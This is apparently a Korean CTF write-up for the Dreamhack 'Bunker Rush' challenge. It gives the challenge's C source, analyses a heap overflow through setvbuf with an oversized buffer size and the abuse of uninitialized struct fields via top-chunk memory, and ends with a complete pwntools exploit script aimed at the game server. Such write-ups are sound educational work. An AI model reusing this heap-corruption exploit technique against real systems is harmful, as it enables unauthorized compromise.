---
title: "Bunker Rush writeup"
date: 2026-04-24 23:40:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, heap, bof, top-chunk, dreamhack]
---

## Analysis

### checksec
```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

### Source Code
```c
//gcc chal.c -o chal
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>


#define BOXER 1
#define YELLOW 2
#define YELLOW_WIN "22222"

typedef struct {
  char name[16];
  long HP;
  long type;
  void (*build)(void *);
  void (*destroyed)(void *);
} Bunker;

typedef struct {
  char name[16];
  long HP;
  long type;
  void (*build)();
  void (*destroyed)();
} Hatchery;

void proc_init ()
{
  setvbuf (stdin, 0, 2, 0);
  setvbuf (stdout, 0, 2, 0);
  setvbuf (stderr, 0, 2, 0);
}

int read_input (char *buf, int len)
{
  int ret;

  ret = read (0, buf, len);

  if (ret < 0)
  {
    fprintf (stderr, "read error!\n");
    exit (1);
  }

  if (buf[ret-1] == '\n')
    buf[ret-1] = '\0';

  return ret;
}


int read_number ()
{
  char buf[16];
  int ret;
  int number;

  ret = scanf (" %d", &number);

  return number;
}

void buildHatchery(Hatchery* this)
{
  puts("Your drone is transformed to Hatchery");
}

void destroyedHatchery(Hatchery* this)
{
  puts("Hatchery is destructed...");
}

Hatchery* newHatchery(long hp) 
{
  Hatchery* hatchery = (Hatchery*)malloc(sizeof(Hatchery));

  strcpy(hatchery->name, "Hatchery");
  hatchery->build = buildHatchery;
  hatchery->destroyed = destroyedHatchery;
  //Boxer changed this line to comment.
  //hatchery->type = YELLOW;
  hatchery->HP = hp;

  return hatchery;
}

void buildBunker(Bunker* this)
{
  puts("SCV starts to build a bunker");
}

void destroyedBunker(Bunker* this)
{
  puts("Bunker is destructed...");
  if(this->type && !strcmp ((char*)(this->type), YELLOW_WIN))
    system("cat flag");
}

Bunker* newBunker(long hp) 
{
  Bunker* bunker = (Bunker*)malloc(sizeof(Bunker));

  strcpy(bunker->name, "Bunker");
  bunker->build = buildBunker;
  bunker->destroyed = destroyedBunker;
  //Yellow changed this line to comment.
  //bunker->type = BOXER;
  bunker->HP = hp;

  return bunker;
}

char canwin='N';
void BuildHatchery() 
{
  puts ("your drone moved to outside.");

  Hatchery* hatchery = newHatchery(0x1250);
  hatchery->build(hatchery);
  Bunker* bunker = newBunker(0x350);
  bunker->build(bunker);

  puts("your drone came out and attacked bunker!");
  puts("now can you beat BoxeR? [y/N]");
  scanf(" %c", &canwin);

  if((char)canwin != 'N') {
    puts("Drones finally destroyed the bunker!");
    bunker->destroyed(bunker);
    puts("Mission Success");
    bunker = NULL;
  } else {
    puts("Bunker is completed");
    hatchery->destroyed(hatchery);
    puts("Failed to mission");
    hatchery = NULL;
  }

  sleep(1);
  exit(0);
}

#define DEFAULT_SIZE 1024
char * buffer = 0;
long size = 0;
void BunkerRushStudy () 
{
  int ret;
  unsigned course;

  printf("your buffer: %p\n", buffer);
  puts("Select your course");
  printf(">> ");
  course = read_number();


  if (course > 2) {
    return;
  }

  if (course < 2) {
    if (buffer == NULL) {
      buffer = (char*)malloc(DEFAULT_SIZE);
      size = DEFAULT_SIZE;
    }
    ret = setvbuf(stdin, buffer, course, size);
  } else {
    ret = setvbuf(stdin, 0, course, 0);
  }

  if (ret < 0) {
    puts("study fail...");
    exit(1);
  }
  puts("Finish and sleep.");  
}

void BuildSpawningPool() {
  
  printf("buffer: ");
  scanf("%lu", &buffer);
  printf("size: ");
  scanf("%lu", &size);

  if (size >0x10000)
    size = 0;
}
void print_menu ()
{
  puts("1. Build Hatchery");
  puts("2. Study Bunkering");
  printf(">> ");
}


int main ()
{
  proc_init(); 
  puts("======================================");
  puts("    Mission: build another Hatchery   ");
  puts("======================================");

  while (1) {
    int menu;
    print_menu();
    menu = read_number();

    switch (menu) {
      case 1:
        BuildHatchery();
        break;

      case 2:
        BunkerRushStudy();
        break;

      case 0x22222:
        BuildSpawningPool();
        break;
        
      default:
        break;
    }
  }
}
```

## Vulnerability Analysis

소스 코드를 간단히 요약하면, 입력할 수 있는 메뉴가 3개 있다. 메뉴 1은 `BuildHatchery`, 메뉴 2는 `BunkerRushStudy`, 메뉴 `0x22222`는 `BuildSpawningPool`이다. `BuildHatchery`는 `Hatchery`와 `Bunker` 구조체를 각각 동적 할당한 뒤 입력을 받아, 입력이 `'N'`인지 아닌지에 따라 해처리 혹은 벙커를 파괴하고 프로그램을 종료한다. `BunkerRushStudy`는 `buffer`에 담긴 주소를 출력해 주고 코스 입력을 받아, 값에 따라 바로 함수를 `return`하거나 `buffer`가 `NULL`인 경우 1024바이트 버퍼를 동적 할당한다. 이후 이 버퍼를 `setvbuf`로 `stdin`의 버퍼로 적용한다. `BuildSpawningPool`은 `buffer`와 `size`에 값을 쓸 수 있게 해준다.

`BunkerRushStudy`에서 `setvbuf`를 호출하는 코드를 살펴보자.

```c
void BunkerRushStudy () 
{
  ...
  if (course < 2) {
    if (buffer == NULL) {
      ...
    }
    ret = setvbuf(stdin, buffer, course, size);
  ...
}
```

`setvbuf`는 libc 함수로, `stdin`에서 읽을 때 libc 내에서 버퍼링을 위해 사용하는 버퍼를 전역 변수 `buffer`로 설정하고 있다. 유저 입력값인 `course`로 버퍼링 모드를, 크기는 전역 변수 `size`로 설정한다. 구체적으로는 `_IO_2_1_stdin_`의 `_IO_buf_base`를 `buffer`로, `buffer + size`를 `_IO_buf_end`로 설정한다. `sys_read` 시 요청 바이트는 `size`가 된다.

가장 눈에 띄는 취약점은 `BuildSpawningPool`에서 `size`를 `0x10000` 이하의 원하는 값으로 바꿀 수 있다는 점이다. `buffer`는 1024바이트로 동적 할당되는데 `size`를 그보다 큰 값으로 바꿀 수 있으므로 힙 BOF 취약점이 존재한다. 다만 `BuildSpawningPool`에서 `size`를 변경하려면 그 전에 `buffer`의 값을 입력하는 것이 선행되어야 한다. `BunkerRushStudy`는 `buffer`에 담긴 주소를 출력해 주므로, `size`를 수정하기 전에 먼저 `BunkerRushStudy`를 통해 `buffer` 주소를 유출하면 된다.

이 힙 BOF 취약점으로 어떻게 플래그를 획득할 수 있을까? `destroyedBunker` 함수를 보자.

```c
void destroyedBunker(Bunker* this)
{
  puts("Bunker is destructed...");
  if(this->type && !strcmp ((char*)(this->type), YELLOW_WIN))
    system("cat flag");
}
```

이 함수는 `BuildHatchery`에서 `Bunker` 구조체가 만들어질 때 `destroyed` 함수 포인터에 초기화되는 함수이다. `Bunker` 구조체의 `type`이 가리키는 값이 `YELLOW_WIN`(`"22222"`)이면 플래그를 출력한다. 따라서 어딘가에 `"22222"`를 먼저 써 둔 뒤 그 주소를 `Bunker`의 `type`에 쓸 수 있으면 플래그를 획득할 수 있다.

이를 위해 ptmalloc2의 동작 방식을 이해해야 한다. ptmalloc2는 모든 빈에 할당할 마땅한 청크가 없으면 top chunk에서 분할하여 할당한다. 프로그램 초기에는 빈에 어떠한 청크도 없으므로 모든 할당이 top chunk에서 이루어진다.

따라서 `BunkerRushStudy`를 호출하여 1024바이트의 `buffer`를 동적 할당받으면, 이 청크는 top chunk에서 분할된 것이므로 `buffer`를 오버플로우시키면 남은 top chunk 영역을 덮어쓸 수 있다. 또한 미리 top chunk를 원하는 값으로 세팅해 놓으면, 이후 동적 할당 시 그 위치를 다시 덮어쓰지 않는 한 값이 그대로 남아 있을 것이다.

`BuildHatchery` 안에서 구조체를 생성하고 초기화하는 코드를 보자.

```c
Hatchery* newHatchery(long hp) 
{
  Hatchery* hatchery = (Hatchery*)malloc(sizeof(Hatchery));

  strcpy(hatchery->name, "Hatchery");
  hatchery->build = buildHatchery;
  hatchery->destroyed = destroyedHatchery;
  //Boxer changed this line to comment.
  //hatchery->type = YELLOW;
  hatchery->HP = hp;

  return hatchery;
}
 
Bunker* newBunker(long hp) 
{
  Bunker* bunker = (Bunker*)malloc(sizeof(Bunker));

  strcpy(bunker->name, "Bunker");
  bunker->build = buildBunker;
  bunker->destroyed = destroyedBunker;
  //Yellow changed this line to comment.
  //bunker->type = BOXER;
  bunker->HP = hp;

  return bunker;
}
```

`Bunker`와 `Hatchery` 모두 생성될 때 8바이트 멤버 변수인 `type`을 초기화하지 않는다. 따라서 `Hatchery`의 `type` 위치에 `"22222\x00"`을 미리 써 두고, 그 주소를 `Bunker`의 `type`에 써 두면, 이후 `BuildHatchery`를 호출했을 때 플래그를 획득할 수 있다.

페이로드를 한 번의 `scanf` 호출 시 전체를 전송하는 방식으로 구성할 수 있다. `scanf` 내부에서 `read` 시스템 콜을 할 때 변경한 `size`만큼 버퍼링 버퍼에 읽어 들이기 때문에, `scanf`가 호출되는 순간 페이로드 전체가 `buffer`와 top chunk에 세팅된다. `Hatchery`에 할당될 주소는 `buffer` 주소 + 1064이다. `buffer`가 1024바이트이고 `Bunker`, `Hatchery` 구조체가 모두 64바이트 청크이므로, 이 크기 정보로 `type` 멤버 변수 및 top chunk의 `size` 필드 오프셋을 계산하여 페이로드를 구성하면 된다.

한 가지 주의할 점으로, `malloc`은 top chunk에서 분할하여 할당할 때 top chunk의 `size`를 검사한다.

```c
  victim = av->top;
  size = chunksize (victim);

  if (__glibc_unlikely (size > av->system_mem))
    malloc_printerr ("malloc(): corrupted top size");

  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
    {
      ...
```

top chunk의 `size`가 힙 크기보다 크면 비정상 종료하고, 요청 청크 크기 + 최소 청크 크기 이상이어야 정상적으로 분할 할당이 이루어진다. 따라서 top chunk의 `size`는 이 조건들을 고려하여 적절한 값으로 세팅해야 한다.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 18904)

    return r


def main():
    r = conn()

    # allocate buffer and apply setvbuf
    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b">> ", b"1")

    # leak buffer address
    r.sendlineafter(b">> ", b"2")
    r.recvuntil(b"your buffer: ")
    buffer = int(r.recvline()[:-1], 16)
    r.sendlineafter(b">> ", b"99999")

    # overwrite size to enable heap BOF
    r.sendlineafter(b">> ", str(0x22222).encode())
    r.sendlineafter(b"buffer: ", str(buffer).encode())
    r.sendlineafter(b"size: ", b"10000")

    # call setvbuf again to apply the new size
    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b">> ", b"1")

    payload = b"1\n" + b"Y\n"           # menu selection and canwin input for scanf
    payload += b"A" * 1020              # pad to fill buffer
    payload += b"A" * 8                 # pad prev_size field of top chunk
    payload += p64(4096)                # overwrite top chunk size
    payload += b"A" * 24                # pad to reach type field of Hatchery
    payload += b"22222\x00"             # write YELLOW_WIN string to Hatchery's type
    payload += b"A" * 58                # pad to reach type field of Bunker
    payload += p64(buffer + 1064)       # write address of YELLOW_WIN string to Bunker's type

    r.sendlineafter(b">> ", payload)
    r.recvuntil(b"Bunker is destructed...\n")
    flag = r.recvline()

    log.success(f"flag: {flag.decode()}")

if __name__ == "__main__":
    main()
```